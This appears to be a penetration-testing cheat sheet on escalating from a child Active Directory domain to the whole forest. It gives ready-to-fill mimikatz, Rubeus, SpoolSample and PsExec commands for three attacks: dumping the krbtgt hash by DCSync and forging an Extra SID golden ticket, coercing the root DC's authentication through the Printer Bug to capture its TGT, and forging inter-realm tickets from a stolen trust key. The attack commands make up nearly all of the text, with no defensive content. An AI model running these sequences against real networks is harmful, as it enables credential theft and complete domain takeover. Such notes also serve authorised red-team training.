---
tags:
  - Active_Directory
  - Foundational
  - Kerberos
  - Lateral_Movement
  - Privilege_Escalation
  - Windows
---

## Extra SIDs Attack (Golden Ticket)
resources: [HackTricks - Inter-Forest Attacks](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)

> [!danger] Add Enterprise Admins SID to golden ticket to compromise entire forest from child domain.

### Attack Requirements
> [!important] Required information for this attack:
> - **krbtgt** hash from child domain
> - **Enterprise Admins SID** from root domain
> - **SID** of child domain

### Get Required Information [Remote]

#### Get Child Domain SID
```powershell
Get-DomainSID
```

```cmd
whoami /user
```

#### Get Enterprise Admins SID
```powershell
Get-DomainGroup -Identity "Enterprise Admins" -Domain <RootDomain> | Select-Object objectsid
```

> [!tip] Enterprise Admins SID format: `<RootDomainSID>-519`

#### Get krbtgt Hash [Remote]
```cmd
mimikatz.exe
lsadump::dcsync /domain:<ChildDomain> /user:krbtgt
```

### Forge Golden Ticket with ExtraSID [Remote]
```cmd
mimikatz.exe
kerberos::golden /user:Administrator /domain:<ChildDomain> /sid:<ChildDomainSID> /krbtgt:<KrbtgtHash> /sids:<EnterpriseAdminsSID> /ptt
```

### Access Root Domain DC [Remote]
```cmd
dir \\<RootDC>\c$
```

```cmd
PsExec.exe \\<RootDC> cmd.exe
```

### Rubeus Extra SID [alternative]
```cmd
Rubeus.exe golden /user:Administrator /domain:<ChildDomain> /sid:<ChildSID> /krbtgt:<Hash> /sids:<EASid> /ptt
```

## Printer Bug (SpoolSample)

> [!info] Force DC to authenticate to attacker-controlled server. Combined with unconstrained delegation to capture TGT.

### Attack Flow
> [!tip] Attack sequence:
> 1. Compromise server with unconstrained delegation in child domain
> 2. Force root DC to authenticate to compromised server
> 3. Capture root DC machine account TGT
> 4. Use TGT for DCSync on root domain

### Execute Printer Bug [Remote]
```cmd
# On unconstrained delegation server
Rubeus.exe monitor /interval:5 /filteruser:<RootDC>$

# Trigger authentication
SpoolSample.exe <RootDC> <CompromisedServer>
```

### Capture and Use TGT [Remote]
```cmd
# Import captured ticket
Rubeus.exe ptt /ticket:<Base64Ticket>

# DCSync root domain
mimikatz.exe
lsadump::dcsync /domain:<RootDomain> /user:Administrator
```

## Trust Key Abuse

### Get Trust Key [Remote]
```cmd
mimikatz.exe
lsadump::trust /patch
```

### Forge Inter-Realm TGT [Remote]
```cmd
mimikatz.exe
kerberos::golden /user:Administrator /domain:<ChildDomain> /sid:<ChildSID> /sids:<EASid> /rc4:<TrustKey> /service:krbtgt /target:<RootDomain> /ptt
```

### Request TGS for Root DC [Remote]
```cmd
Rubeus.exe asktgs /ticket:<InterRealmTGT> /service:cifs/<RootDC>.<RootDomain> /dc:<RootDC> /ptt
```
